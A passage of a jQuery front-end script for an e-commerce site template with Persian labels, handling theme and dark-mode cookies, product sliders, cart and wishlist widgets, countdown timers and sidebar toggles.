// window.oncontextmenu = function() {
//     return !1
// }, jQuery(document).ready(function(e) {
//     document.onkeypress = function(e) {
//         if (123 == (e = e || window.event).keyCode) return !1
//     }, e(document).keydown(function(e) {
//         var n = String.fromCharCode(e.keyCode).toLowerCase();
//         return !e.ctrlKey || "c" != n && "u" != n ? "{" == n ? (alert("Sorry, This Functionality Has Been Disabled!"), !1) : void 0 : (alert("Sorry, This Functionality Has Been Disabled!"), !1)
//     })
// });

// function ecCreateCookie(e, t, o) {
//     var s = new Date;
//     s.setTime(s.getTime() + 24 * o * 60 * 60 * 1e3), document.cookie = e + "=" + t + "; expires=" + s.toGMTString()
// }

// function ecDeleteCookie(e, t) {
//     var o = new Date(0).toGMTString();
//     document.cookie = e + "=" + t + "; expires=" + o
// }

// function ecAccessCookie(e) {
//     for (var t = e + "=", o = document.cookie.split(";"), s = 0; s < o.length; s++) {
//         var i = o[s].trim();
//         if (0 == i.indexOf(t)) return i.substring(t.length, i.length)
//     }
//     return ""
// }

function ecCheckCookie() {
    var e = ecAccessCookie("bgImageModeCookie");
    if ("" != e) {
        var t = e.split("||"),
            o = t[0],
            s = t[1];
        $("body").removeClass("body-bg-1"), $("body").removeClass("body-bg-2"), $("body").removeClass("body-bg-3"), $("body").removeClass("body-bg-4"), $("body").addClass(s), $("#bg-switcher-css").attr("href", "assets/css/backgrounds/" + o + ".css")
    }
    if ("" != ecAccessCookie("rtlModeCookie")) {
        var i = $("<link>", {
            rel: "stylesheet",
            href: "assets/css/rtl.css",
            class: "rtl"
        });
        $(".ec-tools-sidebar .ec-change-rtl").toggleClass("active"), i.appendTo("head")
    }
    if ("" != ecAccessCookie("darkModeCookie")) {
        i = $("<link>", {
            rel: "stylesheet",
            href: "assets/css/dark.css",
            class: "dark"
        });
        $("link[href='assets/css/responsive.css']").before(i), $(".ec-tools-sidebar .ec-change-mode").toggleClass("active"), $("body").addClass("dark")
    } else {
        var n = ecAccessCookie("themeColorCookie");
        "" != n && ($("li[data-color = " + n + "]").toggleClass("active").siblings().removeClass("active"), $("li[data-color = " + n + "]").addClass("active"), "01" != n && $("link[href='assets/css/responsive.css']").before('<link rel="stylesheet" href="assets/css/skin-' + n + '.css" rel="stylesheet">'))
    }
}! function(e) {
    "use strict";
    ecCheckCookie(), e(".clear-cach").on("click", function(e) {
        jQuery("#\\:1\\.container").contents().find("#\\:1\\.restore").click(), ecDeleteCookie("rtlModeCookie", ""), ecDeleteCookie("darkModeCookie", ""), ecDeleteCookie("themeColorCookie", ""), ecDeleteCookie("bgImageModeCookie", ""), location.reload()
    }), e(window).load(function() {
        e("#ec-overlay").fadeOut("slow"), setTimeout(function() {
            switch (window.location.protocol) {
                case "file:":
                    e("body").append('<div id="ec-direct-run" class="ec-direct-run"><div class="ec-direct-body"><h4>قالب به صورت مستقیم لود شده است</h4><p>متوجه شدیم شما قالب را بدون استفاده از لوکال سرور بالا آورده اید. در این حالت به برخی ویژگی ها دسترسی ندارید. لطفا از لوکال سرور یا لایو سرور استفاده نمایید </p></div></div>')
            }
        }, 3e3)
    }), e(".ec-search-bar").focus(function() {
        e(".ec-search-tab").addClass("active")
    }), e(".ec-search-bar").focusout(function() {
        setTimeout(function() {
            e(".ec-search-tab").removeClass("active")
        }, 100)
    });
    new function({
        offset: e
    } = {
        offset: 10
    }) {
        var t, o = e * window.innerHeight / 100,
            s = window.innerHeight - o,
            i = 0,
            n = window.innerWidth;

        function a(e) {
            e.style.animationDelay = e.dataset.animationDelay, e.style.animationDuration = e.dataset.animationDuration, e.classList.add(e.dataset.animation), e.dataset.animated = "true"
        }

        function c(e) {
            var t = e.getBoundingClientRect(),
                a = t.top + parseInt(e.dataset.animationOffset) || t.top,
                c = t.bottom - parseInt(e.dataset.animationOffset) || t.bottom,
                l = t.left,
                r = t.right;
            return a <= s && c >= o && l <= n && r >= i
        }
        t = document.querySelectorAll("[data-animation]:not([data-animated])");

        function l(e) {
            for (var t = e, o = 0, s = t.length; o < s; o++) t[o].dataset.animated || c(t[o]) && a(t[o])
        }

        function r() {
            l(t = document.querySelectorAll("[data-animation]:not([data-animated])"))
        }
        window.addEventListener("load", r, !1), window.addEventListener("scroll", () => l(t), {
            passive: !0
        }), window.addEventListener("resize", () => l(t), !1)
    }({
        offset: 20
    });
    var t, o, s, i, n, a = document.documentElement,
        c = window,
        l = c.scrollY || a.scrollTop,
        r = 0,
        d = 0,
        u = (e(window).scrollTop(), document.getElementById("ec-main-menu-desk"), function(t, o) {
            2 === t && o > 52 ? (d = t, e("#ec-main-menu-desk").addClass("menu_fixed_up")) : 1 === t && (d = t, e("#ec-main-menu-desk").addClass("menu_fixed"), e("#ec-main-menu-desk").removeClass("menu_fixed_up"))
        });
    e(window).on("scroll", function() {
        var o = e(".sticky-header-next-sec").offset().top;
        e(window).scrollTop() <= o + 50 ? e("#ec-main-menu-desk").removeClass("menu_fixed") : ((t = c.scrollY || a.scrollTop) > l ? r = 2 : t < l && (r = 1), r !== d && u(r, t), l = t)
    }), e(document).ready(function() {
        e(".scroll-to ul li a.nav-scroll").bind("click", function(t) {
            e(".scroll-to ul li").removeClass("active"), e(this).parents("li").addClass("active");
            var o = e(this).attr("data-scroll");
            e("html, body").animate({
                scrollTop: e("#" + o).offset().top - 50
            }, 500)
        })
    }), e(".dropdown").on("show.bs.dropdown", function() {
        e(this).find(".dropdown-menu").first().stop(!0, !0).slideDown()
    }), e(".dropdown").on("hide.bs.dropdown", function() {
        e(this).find(".dropdown-menu").first().stop(!0, !0).slideUp()
    }), e(document).ready(function() {
        e(".header-top-lan li").click(function() {
            e(this).addClass("active").siblings().removeClass("active")
        }), e(".header-top-curr li").click(function() {
            e(this).addClass("active").siblings().removeClass("active")
        })
    }), e(".search-btn").on("click", function() {
        e(this).toggleClass("active"), e(".dropdown_search").slideToggle("medium")
    }), e(function() {
        e(".insta-auto, .cat-auto").infiniteslide({
            direction: "left",
            speed: 50,
            clone: 10
        }), e('[data-toggle="tooltip"]').tooltip()
    }), e("#shop_sidebar").stickySidebar({
        topSpacing: 30,
        bottomSpacing: 30
    }), e(".sidebar-toggle-icon").on("click", function() {
        e(".filter-sidebar-overlay").fadeIn(), e(".filter-sidebar").addClass("toggle-sidebar-swipe")
    }), e(".filter-cls-btn").on("click", function() {
        e(".filter-sidebar").removeClass("toggle-sidebar-swipe"), e(".filter-sidebar-overlay").fadeOut()
    }), e(".filter-sidebar-overlay").on("click", function() {
        e(".filter-sidebar").removeClass("toggle-sidebar-swipe"), e(".filter-sidebar-overlay").fadeOut()
    }), e(".ec-remove-wish").on("click", function() {
        e(this).parents(".pro-gl-content").remove(), 0 == e(".pro-gl-content").length && e(".ec-wish-rightside, .wish-empt").html('<p class="emp-wishlist-msg">Your wishlist is empty!</p>')
    }), e(".ec-remove-compare").on("click", function() {
        e(this).parents(".pro-gl-content").remove(), 0 == e(".pro-gl-content").length && e(".ec-compare-rightside").html('<p class="emp-wishlist-msg">Your Compare list is empty!</p>')
    }), e("body").on("click", ".add-to-cart", function() {
        e(".ec-cart-float").fadeIn();
        var t = e(".cart-count-lable").html();
        t++, e(".cart-count-lable").html(t), e(".emp-cart-msg").parent().remove(), setTimeout(function() {
            e(".ec-cart-float").fadeOut()
        }, 5e3);
        var o = '<li><a href="product-left-sidebar.html" class="sidekka_pro_img"><img src="' + e(this).parents().parents().children(".image").find(".main-image").attr("src") + '" alt="product"></a><div class="ec-pro-content"><a href="product-left-sidebar.html" class="cart_pro_title">' + e(this).parents().parents().parents().children(".ec-pro-content").children("h5").children("a").html() + '</a><span class="cart-price"><span>' + e(this).parents().parents().parents().children(".ec-pro-content").children(".ec-price").children(".new-price").html() + '</span> x 1</span><div class="qty-plus-minus"><div class="dec ec_qtybtn">-</div><input class="qty-input" type="text" name="ec_qtybtn" value="1"><div class="inc ec_qtybtn">+</div></div><a href="javascript:void(0)" class="remove">×</a></div></li>';
        e(".eccart-pro-items").append(o)
    }), o = e(".ec-side-toggle"), s = e(".ec-side-cart"), i = e(".mobile-menu-toggle"), o.on("click", function(t) {
        t.preventDefault();
        var o = e(this),
            s = o.attr("href");
        e(".ec-side-cart-overlay").fadeIn(), e(s).addClass("ec-open"), o.parent().hasClass("mobile-menu-toggle") && (o.addClass("close"), e(".ec-side-cart-overlay").fadeOut())
    }), e(".ec-side-cart-overlay").on("click", function(t) {
        e(".ec-side-cart-overlay").fadeOut(), s.removeClass("ec-open"), i.find("a").removeClass("close")
    }), e(".ec-close").on("click", function(t) {
        t.preventDefault(), e(".ec-side-cart-overlay").fadeOut(), s.removeClass("ec-open"), i.find("a").removeClass("close")
    }), e("body").on("click", ".ec-pro-content .remove", function() {
        var t = e(".eccart-pro-items li").length;
        e(this).closest("li").remove(), 1 == t && e(".eccart-pro-items").html('<li><p class="emp-cart-msg">Your cart is empty!</p></li>');
        var o = e(".cart-count-lable").html();
        o--, e(".cart-count-lable").html(o), t--
    }), (n = e(".ec-menu-content, .overlay-menu")).find(".sub-menu").parent().prepend('<span class="menu-toggle"></span>'), n.on("click", "li a, .menu-toggle", function(t) {
        var o = e(this);
        ("#" === o.attr("href") || o.hasClass("menu-toggle")) && (t.preventDefault(), o.siblings("ul:visible").length ? (o.parent("li").removeClass("active"), o.siblings("ul").slideUp(), o.parent("li").find("li").removeClass("active"), o.parent("li").find("ul:visible").slideUp()) : (o.parent("li").addClass("active"), o.closest("li").siblings("li").removeClass("active").find("li").removeClass("active"), o.closest("li").siblings("li").find("ul:visible").slideUp(), o.siblings("ul").slideDown()))
    });
    new Swiper(".ec-slider.swiper-container", {
        loop: !0,
        speed: 2e3,
        effect: "slide",
        autoplay: {
            delay: 7e3,
            disableOnInteraction: !1
        },
        pagination: {
            el: ".swiper-pagination",
            clickable: !0
        },
        navigation: {
            nextEl: ".swiper-button-next",
            prevEl: ".swiper-button-prev"
        }
    });
    e(".qty-product-cover").slick({
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: !1,
        fade: !1,
        asNavFor: ".qty-nav-thumb"
    }), e(".qty-nav-thumb").slick({
        slidesToShow: 4,
        slidesToScroll: 1,
        asNavFor: ".qty-product-cover",
        dots: !1,
        arrows: !0,
        focusOnSelect: !0,
        responsive: [{
            breakpoint: 479,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 2
            }
        }]
    }), e(".zoom-image-hover").zoom();
    var p = e(".qty-plus-minus");
    p.prepend('<div class="dec ec_qtybtn">-</div>'), p.append('<div class="inc ec_qtybtn">+</div>'), e("body").on("click", ".ec_qtybtn", function() {
        var t = e(this),
            o = t.parent().find("input").val();
        if ("+" === t.text()) var s = parseFloat(o) + 1;
        else if (o > 1) s = parseFloat(o) - 1;
        else s = 1;
        t.parent().find("input").val(s)
    });
    new Swiper(".single-product-slider", {
        slidesPerView: 4,
        spaceBetween: 20,
        speed: 1500,
        loop: !0,
        navigation: {
            nextEl: ".swiper-button-next",
            prevEl: ".swiper-button-prev"
        },
        breakpoints: {
            0: {
                slidesPerView: 1
            },
            478: {
                slidesPerView: 1
            },
            576: {
                slidesPerView: 2
            },
            768: {
                slidesPerView: 3
            },
            992: {
                slidesPerView: 3
            },
            1024: {
                slidesPerView: 4
            },
            1200: {
                slidesPerView: 4
            }
        }
    });
    e.scrollUp({
        scrollText: '<i class="ecicon eci-arrow-up" aria-hidden="true"></i>',
        easingType: "linear",
        scrollSpeed: 900,
        animation: "fade"
    }), e("#ec-fs-count-1").countdowntimer({
        startDate: "2021/10/01 00:00:00",
        dateAndTime: "2023/01/01 00:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS"
    }), e("#ec-fs-count-2").countdowntimer({
        startDate: "2021/10/01 00:00:00",
        dateAndTime: "2022/12/01 00:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS"
    }), e("#ec-fs-count-3").countdowntimer({
        startDate: "2021/10/01 00:00:00",
        dateAndTime: "2022/11/01 00:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS"
    }), e("#ec-fs-count-4").countdowntimer({
        startDate: "2021/10/01 00:00:00",
        dateAndTime: "2023/03/01 00:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS"
    }), e(".ec-fre-products").slick({
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1
    }), e(".ec-spe-products").slick({
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1
    }), e(".ec-change-color").on("click", "li", function() {
        e('link[href^="assets/css/skin-"]').remove(), e("link.dark").remove(), e(".ec-change-mode").removeClass("active");
        var t = e(this).attr("data-color");
        if (!e(this).hasClass("active")) return e(this).toggleClass("active").siblings().removeClass("active"), null != t && (e("link[href='assets/css/responsive.css']").before('<link rel="stylesheet" href="assets/css/skin-' + t + '.css" rel="stylesheet">'), ecCreateCookie("themeColorCookie", t, 1)), !1
    }), e(".ec-tools-sidebar .ec-change-rtl .ec-rtl-switch").click(function(t) {
        t.preventDefault();
        var o = e("<link>", {
            rel: "stylesheet",
            href: "assets/css/rtl.css",
            class: "rtl"
        });
        e(this).parent().toggleClass("active");
        e(this).parent().hasClass("ec-change-rtl") && e(this).parent().hasClass("active") ? (o.appendTo("head"), ecCreateCookie("rtlModeCookie", "rtl", 1)) : e(this).parent().hasClass("ec-change-rtl") && !e(this).parent().hasClass("active") && (e("link.rtl").remove(), ecDeleteCookie("rtlModeCookie", "ltr"))
    }), e(".ec-tools-sidebar .ec-change-mode .ec-mode-switch").click(function(t) {
        t.preventDefault();
        var o = e("<link>", {
            rel: "stylesheet",
            href: "assets/css/dark.css",
            class: "dark"
        });
        e(this).parent().toggleClass("active");
        var s = "light";
        e(this).parent().hasClass("ec-change-mode") && e(this).parent().hasClass("active") ? e("link[href='assets/css/responsive.css']").before(o) : e(this).parent().hasClass("ec-change-mode") && !e(this).parent().hasClass("active") && (e("link.dark").remove(), s = "light"), e(this).parent().hasClass("active") ? (e("#ec-fixedbutton .ec-change-color").css("pointer-events", "none"), e("body").addClass("dark"), ecCreateCookie("darkModeCookie", s = "dark", 1)) : (e("#ec-fixedbutton .ec-change-color").css("pointer-events", "all"), e("body").removeClass("dark"), ecDeleteCookie("darkModeCookie", s))
    }), e(".ec-tools-sidebar .ec-fullscreen-mode .ec-fullscreen-switch").click(function(t) {
        t.preventDefault(), e(this).parent().toggleClass("active"), document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement ? document.exitFullscreen ? document.exitFullscreen() : document.msExitFullscreen ? document.msExitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitExitFullscreen && document.webkitExitFullscreen() : document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.msRequestFullscreen ? document.documentElement.msRequestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
    });
    var m = location.href;
    e(".ec-main-menu ul li a").each(function() {
        if ("#" !== e(this).attr("href") && e(this).prop("href") == m) return e(".ec-main-menu a").parents("li, ul").removeClass("active"), e(this).parent("li").addClass("active"), !1
    });
    var g = e(".ec-pro-color, .ec-product-tab, .shop-pro-inner, .ec-new-product, .ec-releted-product, .ec-checkout-pro").find(".ec-opt-swatch");

    function h(t) {
        t.each(function() {
            var t = e(this),
                o = t.hasClass("ec-change-img");

            function s(e) {
                var t = e,
                    s = t.find("a"),
                    i = t.closest(".ec-product-inner").find(".ec-pro-image");
                s.hasClass("loaded") || i.addClass("pro-loading");
                t.find("a").addClass("loaded");
                return t.addClass("active").siblings().removeClass("active"), o && function(e) {
                    var t = e.find(".ec-opt-clr-img"),
                        o = t.attr("data-src"),
                        s = t.attr("data-src-hover") || !1,
                        i = e.closest(".ec-product-inner").find(".ec-pro-image"),
                        n = i.find(".image img.main-image"),
                        a = i.find(".image img.hover-image");
                    o.length && n.attr("src", o);
                    if (o.length) {
                        var c = a.closest("img.hover-image");
                        a.attr("src", s), c.hasClass("disable") && c.removeClass("disable")
                    }!1 === s && a.closest("img.hover-image").addClass("disable")
                }(t), setTimeout(function() {
                    i.removeClass("pro-loading")
                }, 1e3), !1
            }
            t.on("mouseenter", "li", function() {
                s(e(this))
            }), t.on("click", "li", function() {
                s(e(this))
            })
        })
    }
    e(window).on("load", function() {
        h(g)
    }), e("document").ready(function() {
        h(g)
    }), e(".ec-opt-size").each(function() {
        function t(e) {
            var t = e,
                o = t.find("a").attr("data-old"),
                s = t.find("a").attr("data-new"),
                i = t.closest(".ec-pro-content").find(".old-price"),
                n = t.closest(".ec-pro-content").find(".new-price");
            i.text(o), n.text(s), t.addClass("active").siblings().removeClass("active")
        }
        e(this).on("mouseenter", "li", function() {
            t(e(this))
        }), e(this).on("click", "li", function() {
            t(e(this))
        })
    }), e(document).ready(function() {
        e('img.svg_img[src$=".svg"]').each(function() {
            var t = e(this),
                o = t.attr("src"),
                s = t.prop("attributes");
            e.get(o, function(o) {
                var i = e(o).find("svg");
                i = i.removeAttr("xmlns:a"), e.each(s, function() {
                    i.attr(this.name, this.value)
                }), t.replaceWith(i)
            }, "xml")
        })
    }), e("#ec-testimonial-slider").slick({
        rows: 1,
        dots: !0,
        arrows: !1,
        centerMode: !0,
        infinite: !1,
        speed: 500,
        centerPadding: 0,
        slidesToShow: 1,
        slidesToScroll: 1
    }), e("#ec-testimonial-slider").find(".slick-slide").each(function(t) {
        var o = e(this).find(".ec-test-img").html(),
            s = "li:eq(" + t + ")";
        e("#ec-testimonial-slider").find(".slick-dots").find(s).html(o)
    }), e("#ec-brand-slider").slick({
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 7,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 992,
            settings: {
                slidesToShow: 4,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 3
            }
        }, {
            breakpoint: 360,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 2
            }
        }]
    }), e(document).ready(function() {
        e("footer .footer-top .ec-footer-widget .ec-footer-links").addClass("ec-footer-dropdown"), e(".ec-footer-heading").append("<div class='ec-heading-res'><i class='ecicon eci-angle-down'></i></div>"), e(".ec-footer-heading .ec-heading-res").click(function() {
            var t = e(this).closest(".footer-top .col-sm-12").find(".ec-footer-dropdown");
            t.slideToggle("slow"), e(".ec-footer-dropdown").not(t).slideUp("slow")
        })
    }), e(".popup-gallery").magnificPopup({
        type: "image",
        mainClass: "mfp-with-zoom",
        gallery: {
            enabled: !0
        },
        zoom: {
            enabled: !0,
            duration: 300,
            easing: "ease-in-out",
            opener: function(e) {
                return e.is("img") ? e : e.find("img")
            }
        }
    }), e(".ec-gl-btn").on("click", "button", function() {
        e(this).addClass("active").siblings().removeClass("active")
    }), e(document).on("click", ".btn-grid", function(t) {
        var o = e(".shop-pro-inner"),
            s = e(".pro-gl-content");
        t.preventDefault(), o.removeClass("list-view"), s.removeClass("width-100")
    }), e(document).on("click", ".btn-list", function(t) {
        var o = e(".shop-pro-inner"),
            s = e(".pro-gl-content");
        t.preventDefault(), o.addClass("list-view"), s.addClass("width-100")
    }), e(document).on("click", ".btn-grid-50", function(t) {
        var o = e(".shop-pro-inner"),
            s = e(".pro-gl-content");
        t.preventDefault(), o.removeClass("list-view-50"), s.removeClass("width-50")
    }), e(document).on("click", ".btn-list-50", function(t) {
        var o = e(".shop-pro-inner"),
            s = e(".pro-gl-content");
        t.preventDefault(), o.addClass("list-view-50"), s.addClass("width-50")
    }), e(document).ready(function() {
        e(".ec-shop-leftside .ec-sidebar-block .ec-sb-block-content,.ec-blogs-leftside .ec-sidebar-block .ec-sb-block-content,.ec-cart-rightside .ec-sidebar-block .ec-sb-block-content,.ec-checkout-rightside .ec-sidebar-block .ec-sb-block-content").addClass("ec-sidebar-dropdown"), e(".ec-sidebar-title").append("<div class='ec-sidebar-res'><i class='ecicon eci-angle-down'></i></div>"), e(".ec-sidebar-title .ec-sidebar-res").click(function() {
            var t = e(this).closest(".ec-shop-leftside .ec-sidebar-block,.ec-blogs-leftside .ec-sidebar-block,.ec-cart-rightside .ec-sidebar-block,.ec-checkout-rightside .ec-sidebar-wrap").find(".ec-sidebar-dropdown");
            t.slideToggle("slow"), e(".ec-sidebar-dropdown").not(t).slideUp("slow")
        })
    }), e(document).ready(function() {
        e(".ec-more-toggle").click(function() {
            "دسته بندی بیشتر" == e(".ec-more-toggle #ec-more-toggle").text() ? (e(".ec-more-toggle #ec-more-toggle").text("دسته بندی کمتر"), e(".ec-more-toggle").toggleClass("active"), e("#ec-more-toggle-content").slideDown()) : (e(".ec-more-toggle  #ec-more-toggle").text("دسته بندی بیشتر"), e(".ec-more-toggle").removeClass("active"), e("#ec-more-toggle-content").slideUp())
        })
    }), e(document).ready(function() {
        e(".ec-sidebar-block.ec-sidebar-block-clr li").click(function() {
            e(this).addClass("active").siblings().removeClass("active")
        })
    }), e(document).ready(function() {
        e(".ec-faq-wrapper .ec-faq-block .ec-faq-content").addClass("ec-faq-dropdown"), e(".ec-faq-block .ec-faq-title ").click(function() {
            var t = e(this).closest(".ec-faq-wrapper .ec-faq-block").find(".ec-faq-dropdown");
            t.slideToggle("slow"), e(".ec-faq-dropdown").not(t).slideUp("slow")
        })
    }), e(document).ready(function() {
        e(".product_page .ec-sidebar-block .ec-sb-block-content ul li ul").addClass("ec-cat-sub-dropdown"), e(".product_page .ec-sidebar-block .ec-sidebar-block-item").click(function() {
            var t = e(this).closest(".ec-sb-block-content").find(".ec-cat-sub-dropdown");
            t.slideToggle("slow"), e(".ec-cat-sub-dropdown").not(t).slideUp("slow")
        })
    }), e(document).ready(function() {
        e(".ec-sidebar-slider .ec-sb-pro-sl").slick({
            rows: 4,
            dots: !1,
            arrows: !0,
            infinite: !0,
            speed: 500,
            slidesToShow: 1,
            slidesToScroll: 1,
            responsive: [{
                breakpoint: 992,
                settings: {
                    rows: 2,
                    slidesToShow: 2,
                    slidesToScroll: 2,
                    dots: !1
                }
            }, {
                breakpoint: 479,
                settings: {
                    rows: 2,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    dots: !1
                }
            }]
        })
    }), e(".ec-category-section .ec_cat_slider").slick({
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 4,
        slidesToScroll: 4,
        responsive: [{
            breakpoint: 1200,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 3
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToScroll: 3,
                slidesToShow: 3
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 425,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e(".ec-catalog-multi-vendor .ec-multi-vendor-slider").slick({
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 4,
        slidesToScroll: 4,
        responsive: [{
            breakpoint: 1200,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 3
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 425,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e(".single-product-cover").slick({
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: !1,
        fade: !1,
        asNavFor: ".single-nav-thumb"
    }), e(".single-nav-thumb").slick({
        slidesToShow: 4,
        slidesToScroll: 1,
        asNavFor: ".single-product-cover",
        dots: !1,
        arrows: !0,
        focusOnSelect: !0
    }), e("#ec-single-countdown").countdowntimer({
        startDate: "2021/10/01 00:00:00",
        dateAndTime: "2023/01/01 00:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS"
    }), e(document).ready(function() {
        e(".single-pro-content .ec-pro-variation .ec-pro-variation-content li").click(function() {
            e(this).addClass("active").siblings().removeClass("active")
        })
    });
    const f = document.getElementById("ec-sliderPrice");
    if (f) {
        const e = parseInt(f.dataset.min),
            t = parseInt(f.dataset.max),
            o = parseInt(f.dataset.step),
            s = document.querySelectorAll("input.filter__input");
        noUiSlider.create(f, {
            start: [e, t],
            connect: !0,
            step: o,
            range: {
                min: e,
                max: t
            },
            format: {
                to: e => e,
                from: e => e
            }
        }), f.noUiSlider.on("update", (e, t) => {
            s[t].value = e[t]
        }), s.forEach((e, t) => {
            e.addEventListener("change", () => {
                f.noUiSlider.setHandle(t, e.value)
            })
        })
    }

    function v(t, o) {
        e("body").removeClass("body-bg-1"), e("body").removeClass("body-bg-2"), e("body").removeClass("body-bg-3"), e("body").removeClass("body-bg-4"), e("body").addClass(o), e("#bg-switcher-css").attr("href", "assets/css/backgrounds/" + t + ".css"), ecCreateCookie("bgImageModeCookie", t + "||" + o, 1)
    }
    e(".cart-qty-plus-minus").append('<div class="ec_cart_qtybtn"><div class="inc ec_qtybtn">+</div><div class="dec ec_qtybtn">-</div></div>'), e(".cart-qty-plus-minus .ec_cart_qtybtn .ec_qtybtn").on("click", function() {
            var t = e(this),
                o = t.parent().parent().find("input").val();
            if ("+" === t.text()) var s = parseFloat(o) + 1;
            else if (o > 1) s = parseFloat(o) - 1;
            else s = 1;
            t.parent().parent().find("input").val(s)
        }), e(document).ready(function() {
            e(".ec-sb-block-content .ec-ship-title").click(function() {
                e(".ec-sb-block-content .ec-cart-form").slideToggle("slow")
            })
        }), e(document).ready(function() {
            e("button.add-to-cart").click(function() {}), e(".ec-btn-group.wishlist").click(function() {
                e(this).hasClass("active") ? e(this).removeClass("active") : e(this).addClass("active"), e("#wishlist_toast").addClass("show"), setTimeout(function() {
                    e("#wishlist_toast").removeClass("show")
                }, 3e3)
            })
        }), e(document).ready(function() {
            e(".ec-pro-image").append("<div class='ec-pro-loader'></div>")
        }), e(document).ready(function() {
            e(".ec-cart-coupan").click(function() {
                e(".ec-cart-coupan-content").slideToggle("slow")
            }), e(".ec-checkout-coupan").click(function() {
                e(".ec-checkout-coupan-content").slideToggle("slow")
            })
        }), setInterval(function() {
            e(".recent-purchase").stop().slideToggle("slow")
        }, 1e4), e(".recent-close").click(function() {
            e(".recent-purchase").stop().slideToggle("slow")
        }), e(document).ready(function() {
            e(".ec-list").on("click", function() {
                var t = e(this).attr("data-number"),
                    o = e(this).attr("data-message");
                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? window.open("https://wa.me/" + t + "/?text=" + o, "-blank") : window.open("https://web.WhatsApp.com/send?phone=" + t + "&text=" + o, "-blank")
            }), e("ec-style1").launchBtn({
                openDuration: 400,
                closeDuration: 300
            })
        }), e.fn.launchBtn = function(t) {
            var o, s, i, n, a, c, l, r;
            o = e(".ec-button"), s = e(".ec-panel"), i = 0, n = e.extend({
                openDuration: 600,
                closeDuration: 200,
                rotate: !0
            }, t), a = function() {
                s.animate({
                    opacity: "toggle",
                    height: "toggle"
                }, n.openDuration)
            }, c = function() {
                s.animate({
                    opacity: "hide",
                    height: "hide"
                }, n.closeDuration)
            }, l = function(t) {
                return 0 === i ? (n.rotate && e(this).removeClass("rotateBackward").toggleClass("rotateForward"), a(), i++) : (n.rotate && e(this).removeClass("rotateForward").toggleClass("rotateBackward"), c(), i--), t.preventDefault(), !1
            }, r = function(e) {
                e.stopPropagation()
            }, o.on("click", l), s.click(r), e(document).click(function() {
                c(), 1 === i && o.removeClass("rotateForward").toggleClass("rotateBackward"), i = 0
            })
        }, e("body").on("change", ".ec-image-upload", function(t) {
            var o = e(this);
            if (this.files && this.files[0]) {
                var s = new FileReader;
                s.onload = function(e) {
                    var t = o.parent().parent().children(".ec-preview").find(".ec-image-preview").attr("src", e.target.result);
                    t.hide(), t.fadeIn(650)
                }, s.readAsDataURL(this.files[0])
            }
        }), e().appendTo(e("body")), e(".bg-option-box").on("click", function(t) {
            return t.preventDefault(), e(this).hasClass("in-out") ? (e(".bg-switcher").stop().animate({
                right: "0px"
            }, 100), e(".color-option-box").not("in-out") && (e(".skin-switcher").stop().animate({
                right: "-163px"
            }, 100), e(".color-option-box").addClass("in-out")), e(".layout-option-box").not("in-out") && (e(".layout-switcher").stop().animate({
                right: "-163px"
            }, 100), e(".layout-option-box").addClass("in-out"))) : e(".bg-switcher").stop().animate({
                right: "-163px"
            }, 100), e(this).toggleClass("in-out"), !1
        }), e(".back-bg-1").on("click", function(t) {
            v(e(this).attr("id"), "body-bg-1")
        }), e(".back-bg-2").on("click", function(t) {
            v(e(this).attr("id"), "body-bg-2")
        }), e(".back-bg-3").on("click", function(t) {
            v(e(this).attr("id"), "body-bg-3")
        }), e(".back-bg-4").on("click", function(t) {
            v(e(this).attr("id"), "body-bg-4")
        }), e(".lang-option-box").on("click", function(t) {
            return t.preventDefault(), e(this).hasClass("in-out") ? (e(".lang-switcher").stop().animate({
                right: "0px"
            }, 100), e(".color-option-box").not("in-out") && (e(".skin-switcher").stop().animate({
                right: "-163px"
            }, 100), e(".color-option-box").addClass("in-out")), e(".layout-option-box").not("in-out") && (e(".layout-switcher").stop().animate({
                right: "-163px"
            }, 100), e(".layout-option-box").addClass("in-out"))) : e(".lang-switcher").stop().animate({
                right: "-163px"
            }, 100), e(this).toggleClass("in-out"), !1
        }),
        e(".ec-tools-sidebar-toggle").on("click", function(t) {
            return t.preventDefault(), e(this).hasClass("in-out") ? (e(".ec-tools-sidebar").stop().animate({
                left: "0px"
